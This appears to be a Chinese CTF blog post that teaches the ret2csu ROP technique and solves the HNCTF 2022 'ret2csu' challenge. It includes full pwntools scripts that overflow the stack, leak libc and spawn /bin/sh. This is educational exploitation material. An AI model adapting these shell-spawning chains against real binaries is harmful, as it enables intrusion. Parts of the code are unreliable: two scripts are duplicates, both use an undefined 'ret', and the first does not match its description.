---
title: ret2csu
description: 讲述关于ret2csu的故事，并根据ret2csu、pwn、栈溢出给出pwn。
date: 2026-06-21 18:29:40
updated: 2026-06-21 18:29:40
image: https://images.cnblogs.com/cnblogs_com/blogs/860797/galleries/2492655/o_260621104031_1782038254233_compressed%20(2).jpeg
categories: [pwn]
tags: [ret2csu, pwn, 栈溢出]
---

## ret2csu

::alert{icon="tabler:files" color="var(--c-accent)" title="ret2csu解释"}

[中级ROP - CTF Wiki](https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/medium-rop/)

::



**ret2csu** 是一种 ROP（Return-Oriented Programming）高级利用技巧。 它的核心原理是：利用动态链接的 ELF 文件中自带的初始化函数 `__libc_csu_init`，从中提取出两段“万能”的代码片段（Gadget），通过精心的栈布局，组合出能够**同时控制 rdi, rsi, rdx 三个参数并调用任意函数**的 ROP 链。

在 IDA 或 objdump 中查看 `__libc_csu_init` 函数的尾部，你会发现两段黄金代码（地址可能会变，但指令结构几乎固定）：

 Gadget 1：疯狂弹栈

```asm
0x4005fa: pop rbx      ; 将栈顶值弹入 rbx
0x4005fb: pop rbp      ; 将栈顶值弹入 rbp
0x4005fc: pop r12      ; 将栈顶值弹入 r12 (关键：决定等下 call 谁)
0x4005fe: pop r13      ; 将栈顶值弹入 r13 (关键：准备传给 edi)
0x400600: pop r14      ; 将栈顶值弹入 r14 (关键：准备传给 rsi)
0x400602: pop r15      ; 将栈顶值弹入 r15 (关键：准备传给 rdx)
0x400604: ret          ; 返回执行下一条指令 (我们要让它跳到 Gadget 2)
```

Gadget 2：寄存器赋值与函数调用

```asm
0x4005e0: mov rdx, r15 ; rdx = r15 (参数 3 搞定！)
0x4005e3: mov rsi, r14 ; rsi = r14 (参数 2 搞定！)
0x4005e6: mov edi, r13d; edi = r13 的低32位 (参数 1 搞定！注意是 32位)
0x4005e9: call QWORD PTR [r12+rbx*8] ; 调用 [r12+rbx*8] 指向的函数
```

我们的目标是执行目标函数（比如 GOT 表里的某个函数），并避免程序崩溃。执行流程如下：

1. **先跳入 Gadget 1**：通过栈溢出，将返回地址覆盖为 Gadget 1 的地址。程序执行一连串的 `pop`，把我们布置在栈上的恶意数据全部吸入寄存器中。
2. **连接 Gadget 2**：Gadget 1 最后的 `ret` 指令，我们将它指向 Gadget 2 的地址。
3. **参数传递**：进入 Gadget 2 后，刚才存入 `r15`, `r14`, `r13` 的值被完美复制到了 `rdx`, `rsi`, `edi` 中。
4. **触发调用 (Call)**：执行 `call [r12+rbx*8]`。
   - 为了方便控制，我们通常在 Gadget 1 阶段把 **`rbx` 设置为 0**。
   - 这样指令就变成了 `call [r12]`。
   - **⚠️ 核心易错点**：这里是 `call [r12]` 而不是 `call r12`。这意味着 `r12` 里面必须存放一个**指针的地址**（比如某个函数的 GOT 表地址，或 bss 段上存有函数地址的指针），而不能直接是函数的实际地址。

## 历史因素

1.导火索：从 x86 到 x64 的架构剧变 (2000s 后期)

在早期的 32 位 (x86) 时代，函数的参数是通过**栈 (Stack)** 来传递的。黑客在进行 ROP 利用时非常轻松：只需把想执行的函数地址和参数顺着栈一路往下摆，程序自然会去栈上取参数。

但当世界步入 64 位 (x64) 时代后，Linux 采用了 System V AMD64 ABI 调用约定。最大的变化是：**前 6 个参数不再放在栈上，而是强制要求放在寄存器里**（依次是 `rdi`, `rsi`, `rdx`, `rcx`, `r8`, `r9`）。

这直接导致 32 位的经典栈溢出打法失效了。黑客如果想调用系统函数（比如 `execve('/bin/sh', 0, 0)`），就必须先想办法把恶意的参数值塞进这几个特定的寄存器里。

---



2. 诞生与黄金时代：寻找“通用 Gadget” (2010s)

为了把数据塞进寄存器，黑客需要寻找类似 `pop rdi; ret` 这样的汇编指令片段（Gadget）。

- `pop rdi` 和 `pop rsi` 通常很容易在程序中找到。
- 但是，控制第三个参数的 **`pop rdx` 极其罕见**。因为编译器在正常编译代码时，很少会生成刚好以 `ret` 结尾的 `pop rdx` 指令流。

**没有 `rdx`，就没法顺利执行系统调用拿 shell，怎么办？**

在 2010 年代初的极客社区中，有人开始将目光投向了每一个 C 语言程序自带的**初始化代码**。无论程序员写了什么代码，GCC 在编译动态链接的 ELF 文件时，都会默认打包进去几个用于环境初始化的内置函数，其中就包括 `__libc_csu_init`（用于处理 C 程序的全局构造函数）。

---

黑客们惊喜地发现，`__libc_csu_init` 的尾部有一段极其完美的连续 `pop` 和寄存器转移指令。因为它**存在于几乎所有的动态链接程序中**，不需要程序本身代码有多复杂，所以它被奉为 x64 漏洞利用的“通用 Gadget” (Universal Gadget)。这套打法正式得名 **ret2csu**，并作为标准操作统治了 CTF 比赛和真实世界的 x64 ROP 漏洞利用长达近十年。

---



3. 终结与落幕：Glibc 2.34 的大清洗 (2021年)

安全防御永远是在攻防对抗中进化的。ret2csu 的泛滥成了安全防护的眼中钉。

随着 2021 年 **Glibc 2.34** 版本的发布，开发者对 C 程序的启动和初始化代码进行了重大重构。他们将这些初始化逻辑整合到了 libc 内部，**直接从默认的编译产物中删除了 `__libc_csu_init` 和 `__libc_csu_fini` 等函数**。

**这意味着什么？**

- 如果你在利用早期的系统（比如 Ubuntu 16.04, 18.04, 20.04），ret2csu 依然是百试百灵的屠龙刀。
- 但如果你面对的是比较新的系统（比如 Ubuntu 22.04 及以上版本），使用新版 GCC 编译出的程序里**已经找不到 `__libc_csu_init` 了**。

ret2csu 从此逐渐退出历史的正面舞台，标志着 x64 基础 ROP 利用一个“无脑套用”时代的结束。

## [HNCTF 2022 WEEK2] ret2csu

::alert{icon="tabler:files" color="var(--c-accent)" title="题目链接"}

https://www.nssctf.cn/problem/2963

::

动画解释

::alert{icon="tabler:files" color="var(--c-accent)" title="动画链接"}

[HACKED笔记pwn/动画链接/NSSCTF-PWN/栈/ret2csu · 工程部Teddy Bear/网络安全 - 码云 - 开源中国](https://gitee.com/ASUS_HACKED/cybersecurity/tree/比赛附件/HACKED笔记pwn/动画链接/NSSCTF-PWN/栈/ret2csu)

::

### 1. 题目分析

#### 1.1 文件信息

```
ret2csu: ELF 64-bit LSB executable, x86-64, dynamically linked
libc.so.6: 题目提供的 libc (Ubuntu GLIBC 2.35-0ubuntu3.1)
```

---



#### 1.2 保护检查

```asm
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
```

- 无 Canary → 栈溢出不需要绕过
- 无 PIE → 地址固定，直接用
- NX 开启 → 不能执行栈上的 shellcode

---



#### 1.3 源码分析

```c
void vuln() {
    char buf[0x100];
    write(1, "Input:\n", 7);
    read(0, buf, 0x200);    // 栈溢出！buf 只有 0x100，read 读了 0x200
    write(1, "Ok.\n", 4);
    return;
}
```

**漏洞**: `buf` 大小 0x100，`read` 读取 0x200，溢出 0x100 字节。

---



#### 1.4 可用 Gadget

```
pop rdi; ret          → 0x4012B3 ✅
pop rsi; pop r15; ret → 0x4012B1 ✅
pop rdx; ret          → ❌ 没有
```

程序导入了 `write` 和 `read`，但没有 `system`、`execve`、`/bin/sh`。

---

先看看这题的信息

![image-20260621182320667](https://img2024.cnblogs.com/blog/3726946/202606/3726946-20260621182909012-1566628094.png)

想要泄露出libc就得知道write参数，但是x64下第三个参数约定是rdx，并没有出现单独的,但是出现了__libc_csu_init函数文件下的寄存器传参

#### 2. 核心思路：ret2csu

##### 2.1 为什么需要 ret2csu？

需要调用 `write(1, write@GOT, 8)` 泄露 GOT 表地址，但没有 `pop rdx; ret`，无法设置 write 的第三个参数（长度）。

ret2csu 利用 `__libc_csu_init` 尾部的 gadget 来控制 rdx。

##### 2.2 两个 Gadget

```
Gadget 1 (0x4012AA):  设置参数
    pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; ret

Gadget 2 (0x401290):  调用函数
    mov rdx, r14      → r14 控制 rdx（第3个参数）
    mov rsi, r13      → r13 控制 rsi（第2个参数）
    mov edi, r12d     → r12 控制 edi（第1个参数）
    call [r15]        → r15 控制调用哪个函数
```

##### 2.3 执行流程

```
ret → Gadget 1（pop 设置寄存器）
  → ret → Gadget 2（call [r15] 调用函数）
    → 函数返回后，Gadget 1 的清理代码执行
      → ret → 下一个目标
```

---

#### 3. 三套写法

根据题目条件不同，有三种利用方式。本题给了 libc 和 `pop rdi`，三种都可以用。

---

##### 写法一：盲打 — 泄露地址 + 查 libc 版本（没给 libc 文件）

**适用场景**: 题目没给 libc 文件，但有 `pop rdi; ret`。

**思路**: 泄露多个函数的真实地址 → 去 libc.rip 查版本 → 算出 system 和 "/bin/sh" 偏移。

```python
from pwn import *
context(os='linux', arch='amd64')
r = process('./ret2csu')
#r = remote('node5.anna.nssctf.cn',23664)
elf = ELF('./ret2csu')
libc = ELF('./libc.so.6')

vuln = 0x0401176
gadget_1 = 0x04012AA
gadget_2 = 0x0401290
offset = 0x100+0x8
write_got = elf.got['write']

#part1
#wrint(1,wrint_got,8)rdi = 1; rsi = write_got;rdx = 0x8
payload_1 = offset*b'a'
payload_1 += p64(gadget_1)
#rbx = 0,rbp = 1,r12->edi = 1,r13->rsi = write_got,r14->rdx = 0x8
payload_1 += p64(0)+p64(1)+p64(1)+p64(write_got)+p64(0x8)
#call write
payload_1 +=p64(write_got)
payload_1 += p64(gadget_2)
payload_1 += p64(1)*7
payload_1 += p64(vuln)
r.recvuntil(b'Input:\n')
r.send(payload_1)
r.recvuntil(b'Ok.\n')

leak = u64(r.recv(8))
print(f'leak: {hex(leak)}')
print(f'write offset: {hex(libc.symbols["write"])}')
libc.address = leak - libc.symbols['write']
print(f'libc base: {hex(libc.address)}')
system = libc.symbols['system']
print(f'system: {hex(system)}')

bin_sh = next(libc.search(b'/bin/sh\x00'))

#part2

pop_rdi = 0x04012b3
payload_2 = offset*b'a'+p64(pop_rdi)+p64(bin_sh)+p64(ret)+p64(system)
r.recvuntil(b'Input:\n')
r.sendline(payload_2)
r.interactive()
```

**关键点**:

- 泄露 `write`、`setbuf`、`read`、`__libc_start_main` 等多个地址，提高匹配准确度
- 用 https://libc.rip/ 或 https://libc.blukat.me/ 查询版本
- 查到版本后下载 libc，计算偏移

---

##### 写法二：直接用附件 libc（给了 libc 文件 + 有 pop_rdi）和写法一一样的

**适用场景**: 题目给了 libc 文件，且有 `pop rdi; ret`。**本题就是这种。**

**思路**: 直接用给的 libc 算偏移，不需要查版本。

```python
from pwn import *
context(os='linux', arch='amd64')
r = process('./ret2csu')
#r = remote('node5.anna.nssctf.cn',23664)
elf = ELF('./ret2csu')
libc = ELF('./libc.so.6')

vuln = 0x0401176
gadget_1 = 0x04012AA
gadget_2 = 0x0401290
offset = 0x100+0x8
write_got = elf.got['write']

#part1
#wrint(1,wrint_got,8)rdi = 1; rsi = write_got;rdx = 0x8
payload_1 = offset*b'a'
payload_1 += p64(gadget_1)
#rbx = 0,rbp = 1,r12->edi = 1,r13->rsi = write_got,r14->rdx = 0x8
payload_1 += p64(0)+p64(1)+p64(1)+p64(write_got)+p64(0x8)
#call write
payload_1 +=p64(write_got)
payload_1 += p64(gadget_2)
payload_1 += p64(1)*7
payload_1 += p64(vuln)
r.recvuntil(b'Input:\n')
r.send(payload_1)
r.recvuntil(b'Ok.\n')

leak = u64(r.recv(8))
print(f'leak: {hex(leak)}')
print(f'write offset: {hex(libc.symbols["write"])}')
libc.address = leak - libc.symbols['write']
print(f'libc base: {hex(libc.address)}')
system = libc.symbols['system']
print(f'system: {hex(system)}')

bin_sh = next(libc.search(b'/bin/sh\x00'))

#part2

pop_rdi = 0x04012b3
payload_2 = offset*b'a'+p64(pop_rdi)+p64(bin_sh)+p64(ret)+p64(system)
r.recvuntil(b'Input:\n')
r.sendline(payload_2)
r.interactive()
```

**关键点**:

- 本地测试需要用 patchelf 绑定题目 libc 和链接器
- `/bin/sh` 直接从 libc 搜索，不需要写入 BSS
- `ret` gadget 用于栈对齐，避免 movaps 崩溃

或者用HACKED的脚本获取libc连接器

**本地 patchelf 方法**:

```bash
# 提取链接器
wget https://launchpadlibrarian.net/612471225/libc6_2.35-0ubuntu3.1_amd64.deb
dpkg-deb -x libc6_2.35-0ubuntu3.1_amd64.deb extracted/
cp extracted/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2 .

# 绑定
cp ret2csu ret2csu_patched
patchelf --set-interpreter ./ld-linux-x86-64.so.2 --set-rpath . ret2csu_patched
```

---

##### 写法三：纯 ret2csu — 无 pop_rdi，写 BSS（最通用）

**适用场景**: 程序没有 `pop rdi; ret`，或者没有 `pop rsi; ret` 等 gadget。**全部用 ret2csu 控制参数。**

**思路**: 用 ret2csu 调用 `read(0, BSS, 8)` 把 `"/bin/sh"` 写入 BSS 段，再用 ret2csu 调用 `system(BSS)`。

然后再次通过ret2csu调用控制

```python
from pwn import *
context(os='linux', arch='amd64')
r = process('./ret2csu')
#r = remote('node5.anna.nssctf.cn',23664)
elf = ELF('./ret2csu')
libc = ELF('./libc.so.6')

vuln = 0x0401176
gadget_1 = 0x04012AA
gadget_2 = 0x0401290
offset = 0x100+0x8
write_got = elf.got['write']

#part1
#wrint(1,wrint_got,8)rdi = 1; rsi = write_got;rdx = 0x8
payload_1 = offset*b'a'
payload_1 += p64(gadget_1)
#rbx = 0,rbp = 1,r12->edi = 1,r13->rsi = write_got,r14->rdx = 0x8
payload_1 += p64(0)+p64(1)+p64(1)+p64(write_got)+p64(0x8)
#call write
payload_1 +=p64(write_got)
payload_1 += p64(gadget_2)
payload_1 += p64(1)*7
payload_1 += p64(vuln)
r.recvuntil(b'Input:\n')
r.send(payload_1)
r.recvuntil(b'Ok.\n')

leak = u64(r.recv(8))
print(f'leak: {hex(leak)}')
print(f'write offset: {hex(libc.symbols["write"])}')
libc.address = leak - libc.symbols['write']
print(f'libc base: {hex(libc.address)}')
system = libc.symbols['system']
print(f'system: {hex(system)}')


#ret2csu if pop rdi not find
#read(0,0x0404030,0x8)

ret = 0x04011DB
buf_addr = 0x0404030


read_got = elf.got['read']
payload_2= offset*b'a'
payload_2 += p64(gadget_1)
#rbx = 0,rbp = 1,r12->edi = 1,r13->rsi = buf_addr,r14->rdx = 0x8
payload_2 += p64(0)+p64(1)+p64(0)+p64(buf_addr)+p64(0x8)
#call read
payload_2 += p64(read_got)
payload_2 += p64(gadget_2)
payload_2 += p64(1)*7
payload_2 += p64(vuln)

r.recvuntil(b'Input:\n')
r.send(payload_2)
r.recvuntil(b'Ok.\n')
r.send(b'/bin/sh\x00')

#part3 
payload_3= offset*b'a'
payload_3 += p64(gadget_1)
#rbx = 0,rbp = 1,r12->edi = 1,r13->rsi = buf_addr+8 =system_addr,r14->rdx = 0x8
payload_3 += p64(0)+p64(1)+p64(0)+p64(buf_addr+0x8)+p64(0x8)
#call read
payload_3 += p64(read_got)
payload_3 += p64(gadget_2)
payload_3 += p64(1)*7
payload_3 += p64(vuln)
r.recvuntil(b'Input:\n')
r.send(payload_3)
r.recvuntil(b'Ok.\n')
r.send(p64(system))


#part4
payload_4= offset*b'a'
payload_4 += p64(ret)
payload_4 += p64(gadget_1)
#rbx = 0,rbp = 1,r12->edi = 1,r13->rsi = buf_addr+8 =system_addr,r14->rdx = 0x8
payload_4 += p64(0)+p64(1)+p64(buf_addr)+p64(0)+p64(0)
#call system
payload_4 += p64(buf_addr+0x8)
payload_4 += p64(gadget_2)
payload_4 += p64(1)*7
payload_4 += p64(vuln)
r.recvuntil(b'Input:\n')
r.send(payload_4)
r.recvuntil(b'Ok.\n')

r.interactive()
```

**关键点**:

- 不需要任何 `pop rdi`、`pop rsi` 等独立 gadget
- 全部参数通过 ret2csu 的 Gadget 1 pop 设置
- `read(0, BSS, N)` 从 stdin 读取数据写入 BSS
- 把 `"/bin/sh"` 字符串和 `system` 函数地址都写入 BSS
- 最后通过 `call [BSS+8]` 调用 system，参数为 BSS 地址（即 "/bin/sh"）
- **栈对齐**: system 内部使用 `movaps` 指令要求栈 16 字节对齐，Part 4 需要在 payload 前加 `ret` 垫片修正对齐

---

### 4. 三种写法对比

|              | 写法一 (盲打)       | 写法二 (本题) | 写法三 (纯 ret2csu)           |
| ------------ | ------------------- | ------------- | ----------------------------- |
| 给 libc 文件 | ❌ 没给              | ✅ 给了        | 不需要                        |
| 有 pop_rdi   | ✅ 有                | ✅ 有          | ❌ 没有                        |
| /bin/sh 来源 | libc.rip 查版本后算 | libc 文件里搜 | 自己写入 BSS                  |
| 难度         | 中等（要查版本）    | 最简单        | 最复杂                        |
| 通用性       | 高                  | 高            | 最高（不依赖任何独立 gadget） |

---

### 5. 关键知识点

#### 5.1 ret2csu 适用场景

当程序没有 `pop rdx; ret` gadget，但需要控制 rdx（第3个参数）时使用。

#### 5.2 Gadget 顺序

必须**先 Gadget 1 设置参数，再 Gadget 2 调用函数**。

#### 5.3 recv 注意事项

| 泄露方式            | 输出格式   | 接收方法                      |
| ------------------- | ---------- | ----------------------------- |
| `printf("%p")`      | ASCII 文本 | `int(recvline().strip(), 16)` |
| `write(1, addr, 8)` | 原始二进制 | `u64(recv(8))`                |

#### 5.4 栈对齐（重要！）

Ubuntu 高版本 libc 的 `system()` 内部使用 `movaps` 指令，要求栈 16 字节对齐。如果栈不对齐，会触发 SIGSEGV。

**判断方法**: 如果泄露地址正确、system 地址正确，但调用 system 时崩溃，大概率是栈对齐问题。

**解决方法**: 在调用 system 的 payload 前加一个 `ret` 垫片，多弹 8 字节修正对齐：

```python
# 没有垫片（可能崩溃）
payload += p64(pop_rdi) + p64(bin_sh) + p64(system)

# 有垫片（安全）
payload += p64(ret) + p64(pop_rdi) + p64(bin_sh) + p64(system)
```

**注意**: ret2csu 链中如果最后一个 gadget 是 `system`（不返回），也需要加垫片。如果最后一个 gadget 是 `vuln`（返回继续溢出），一般不需要。

#### 5.5 GOT 和 PLT

- **PLT**: 函数跳板代码，处理第一次调用时的懒加载
- **GOT**: 存放函数真实地址的表格，程序调用过函数后自动填充
- 已调用过的函数可以直接 `call [GOT]`，不需要经过 PLT

#### 5.6 本地复现 (patchelf)

```bash
# 从 Ubuntu deb 包提取链接器
wget https://launchpadlibrarian.net/612471225/libc6_2.35-0ubuntu3.1_amd64.deb
dpkg-deb -x libc6_2.35-0ubuntu3.1_amd64.deb extracted/
cp extracted/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2 .

# patchelf 绑定
cp ret2csu ret2csu_patched
patchelf --set-interpreter ./ld-linux-x86-64.so.2 --set-rpath . ret2csu_patched
```

#### 5.7 libc 版本查询工具

- https://libc.rip/
- https://libc.blukat.me/
- https://libc.nullpt.rs/

输入泄露的函数地址，可匹配 libc 版本，获取函数偏移。

---